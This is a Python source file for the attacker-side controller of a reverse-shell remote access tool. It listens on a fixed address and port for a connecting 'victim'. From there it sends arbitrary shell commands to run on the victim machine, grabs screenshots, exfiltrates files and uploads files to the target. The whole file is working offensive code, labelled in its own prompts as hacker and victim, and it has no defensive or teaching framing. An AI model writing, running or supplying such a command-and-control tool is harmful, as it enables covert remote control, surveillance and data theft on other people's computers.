import socket
import struct
import time
import os

hacker_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
hacker_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

hacker_ip = "192.168.100.17"
hacker_port = 10000
hacker_socket.bind((hacker_ip, hacker_port))
hacker_socket.listen(1)

def file_receive(file_size):
    received_data = b""
    while len(received_data) < file_size:
        try:
            file_chunk = client_socket.recv(5242880)
        except Exception as e:
            print(f"\nError during file receive: {e}")
            break
        if not file_chunk:
            print("\nConnection lost while downloading!")
            break
        received_data += file_chunk

    return received_data

print("Listening for incoming connections...")

while True:
    client_socket, client_address = hacker_socket.accept()
    print(f"\n[+] Connected with {client_address}")

    try:
        while True:
            command = input("\nEnter command to execute on victim: ")

            if not command.strip():
                continue

            if command == "stop":
                try:
                    client_socket.send(command.encode())
                except Exception as e:
                    print(f"\nSend failed: {e}")
                client_socket.close()
                print("[*] Session terminated. Exiting.")
                exit(0)

            if command == "screenshot":
                if len(command) > 10:
                    print("You have to type command (screenshot) only!")
                    continue
                
                try:
                    client_socket.send(command.encode())
                    response = client_socket.recv(4096).decode()
                    print(response)
                    file_name = response[21:].strip()
                except Exception as e:
                    print(f"\nSend failed: {e}")
                    continue
                
                try:
                    raw_size = client_socket.recv(8)
                except Exception as e:
                    print(f"\nFailed to receive file size: {e}")
                    continue

                if len(raw_size) < 8:
                    print("\nFailed to receive complete file size!")
                    continue

                file_size = struct.unpack("!Q", raw_size)[0]
                print(f"Receiving file ({file_size} bytes)...\n")

                received_data = file_receive(file_size)
                try:
                    with open(file_name, "wb") as file:
                        file.write(received_data)
                        print(f"{file_name} downloaded successfully!")
                except Exception as e:
                    print(f"\nFailed to write file: {e}")

                try:
                    screenshot_response = client_socket.recv(1024).decode()
                    print(screenshot_response)
                except Exception as e:
                    print("No response received from victim!")
                    continue

                continue

            if command.startswith("download"):
                try:
                    try:
                        client_socket.send(command.encode())
                    except Exception as e:
                        print(f"\nSend failed: {e}")
                        continue

                    try:
                        file_exists_response = client_socket.recv(1024)
                    except Exception as e:
                        print(f"\nFailed to receive file info: {e}")
                        continue

                    print(file_exists_response.decode("utf-8"))
                    time.sleep(0.1)

                    if (b"Error:" in file_exists_response or 
                        b"doesn't exist" in file_exists_response or 
                        b"Type the exact file name" in file_exists_response):
                        continue

                    if b"Yes, the file" in file_exists_response:
                        try:
                            raw_size = client_socket.recv(8)
                        except Exception as e:
                            print(f"\nFailed to receive file size: {e}")
                            continue

                        if len(raw_size) < 8:
                            print("\nFailed to receive complete file size!")
                            continue

                        file_size = struct.unpack("!Q", raw_size)[0]
                        print(f"Receiving file ({file_size} bytes)...\n")

                        received_data = file_receive(file_size)
                    
                        file_name = command[9:].strip()
                        try:
                            with open(file_name, "wb") as file:
                                file.write(received_data)
                            print(f"{file_name} downloaded successfully!")
                        except Exception as e:
                            print(f"\nFailed to write file: {e}")

                    continue

                except (BrokenPipeError, ConnectionResetError):
                    print("\nConnection lost during download. Waiting for new connection...")
                    client_socket.close()
                    break

            if command.startswith("upload"):
                if len(command.strip()) <= 6 or not command[7:].strip():
                    print("\nError: Please specify a filename after 'upload'\nupload <filename>")
                    continue
                
                try:
                    client_socket.send(command.encode())
                except Exception as e:
                    print(f"\nSend failed (upload command): {e}")
                    client_socket.close()
                    break
                
                file_name = command[7:].strip()
                if os.path.exists(file_name):    
                    file_size = os.path.getsize(file_name)
                    if file_size == 0:
                        print("\nThe file must not be Empty!")
                        try:
                            client_socket.send(struct.pack("!Q", 0))
                        except Exception as e:
                            print(f"\nSend failed (0 file size): {e}")
                            client_socket.close()
                        continue
                    try:
                        client_socket.send(struct.pack("!Q", file_size))
                    except Exception as e:
                        print(f"\nSend failed: {e}")
                        client_socket.close()
                        continue

                    send_failed = False
                    with open(file_name, "rb") as file:
                        while True:
                            file_chunk = file.read(5242880)
                            if not file_chunk:
                                break
                            try:
                                client_socket.send(file_chunk)
                            except Exception as e:
                                print(f"\nSend failed: {e}")
                                send_failed = True
                                break
                    if send_failed:
                        continue
                    else:
                        print(f"{file_name} uploaded successfully!")
                else:
                    print("The file didn't exist on your end!")
                    try:
                        client_socket.send(struct.pack("!Q", 0))
                        print("(Sent 0 file size to victim to indicate file not found on hacker side)")
                    except Exception as e:
                        print(f"\nSend failed (0 file size): {e}")
                        client_socket.close()
                        break
        
                continue
            
            try:
                client_socket.send(command.encode())
            except (BrokenPipeError, ConnectionResetError) as e:
                print(f"\nConnection lost: {e}. Waiting for new connection...")
                client_socket.close()
                break
            except Exception as e:
                print(f"\nSend failed: {e}")
                continue

            try:
                response = client_socket.recv(65535)
                if not response:
                    print("\nVictim closed the connection.")
                    client_socket.close()
                    break
                print(response.decode('utf-8'))
            except Exception as e:
                print(f"\nError receiving response: {e}")
                client_socket.close()
                break

    except KeyboardInterrupt:
        print("\n[!] Interrupted by user. Closing session.")
        client_socket.close()
        break
